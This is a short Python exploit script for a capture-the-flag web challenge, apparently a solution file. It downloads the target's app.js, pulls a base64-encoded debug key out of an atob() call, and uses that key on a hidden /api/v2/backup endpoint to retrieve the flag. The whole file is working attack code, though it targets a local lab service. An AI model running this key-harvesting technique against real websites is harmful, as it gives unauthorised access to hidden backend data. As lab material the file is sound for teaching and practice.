#!/usr/bin/env python3
# Usage: python3 exp.py [base_url]      (default http://127.0.0.1:8082)
#
# 前端审计：读 app.js -> 解出 base64 调试 key -> 调隐藏接口拿 flag。
import base64
import json
import re
import sys
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8082").rstrip("/")


def http(path):
    return urllib.request.urlopen(BASE + path, timeout=10).read().decode("utf-8", "replace")


js = http("/static/app.js")
m = re.search(r'atob\(\s*"([A-Za-z0-9+/=]+)"\s*\)', js)
if not m:
    sys.exit("[-] no atob(...) key found in app.js - wrong challenge?")

key = base64.b64decode(m.group(1)).decode()
print("[*] debug key = %s" % key)

resp = json.loads(http("/api/v2/backup?key=" + urllib.parse.quote(key)))
if not resp.get("flag"):
    sys.exit("[-] flag not returned: %s" % resp)

print(resp["flag"])
